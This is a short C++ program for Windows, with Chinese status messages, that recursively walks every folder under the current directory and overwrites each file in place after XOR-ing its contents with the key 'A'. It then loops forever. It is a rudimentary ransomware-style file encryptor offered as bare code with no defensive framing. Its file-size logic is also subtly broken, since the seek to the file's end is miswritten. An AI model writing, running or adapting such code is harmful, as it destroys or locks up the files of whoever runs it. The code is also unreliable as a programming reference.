#include<iostream>
#include<fstream>
#include<Windows.h>
#include<random>
using namespace std;
void traveldir(char* pathname);
void Encrypting(char * file);
void Encrypting(char* str, int length);
WIN32_FIND_DATA finddata;
int main()
{
	char pathname[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, pathname);
	cout << pathname<<endl;
	traveldir(pathname);
	while (1);
	return 0;
}
void traveldir(char* pathname)
{
	char buff[MAX_PATH];
	char temp[MAX_PATH];
	bool iscontinue = true;
	sprintf(buff, "%s\\*.*", pathname);
	HANDLE h =FindFirstFile(buff, &finddata);
	if (h == INVALID_HANDLE_VALUE)
	{
		cout << "失败" << endl;
		return;
	}
	while(iscontinue)
	{
		memset(temp, 0, MAX_PATH);
		sprintf(temp, "%s\\%s", pathname, finddata.cFileName);
		if (finddata.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			if (strcmp(".", finddata.cFileName) != 0 && strcmp("..", finddata.cFileName) != 0)
			{
				cout << "文件夹:" << temp << endl;
				traveldir(temp);
			}
		}
		else
		{
			cout << "文件:" << temp << endl;
			Encrypting(temp);
		}
		iscontinue = FindNextFile(h, &finddata);
	}
}
void Encrypting(char* file)
{
	fstream fs;
	fs.open(file);
	if (fs.is_open()==false)
	{
		cout << "打开失败"<<endl;
	}
	else
	{
		fs.seekg(ios::end);
		int length = fs.tellg();
		fs.seekg(ios::beg);
		char* buffer = new char[length];
		fs.read(buffer, length);
		fs.close();
		Encrypting(buffer, length);
		fs.open(file);
		fs.seekg(ios::beg);
		fs.write(buffer, length);
		delete []buffer;
	}
}void Encrypting(char* str, int length)//
{
	const char key = 'A';
	for (int i = 0; i < length; i++)
		str[i] = str[i] ^ key;
}